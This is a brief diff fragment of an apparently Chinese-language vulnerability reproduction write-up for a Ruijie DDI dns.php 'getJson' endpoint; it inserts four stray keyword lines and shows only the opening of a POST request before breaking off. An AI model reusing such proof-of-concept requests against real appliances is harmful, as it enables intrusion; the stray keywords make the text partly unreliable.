@@ -34,6 +34,14 @@ public function getJsonAction() {
 
 # 漏洞复现
 
+深入探索
+
+软件
+
+编程
+
+计算机服务器
+
 ```
 POST /ddi/server/dns.php?a=getJson HTTP/1.1
 Host: ruijieweb.mrxn.net
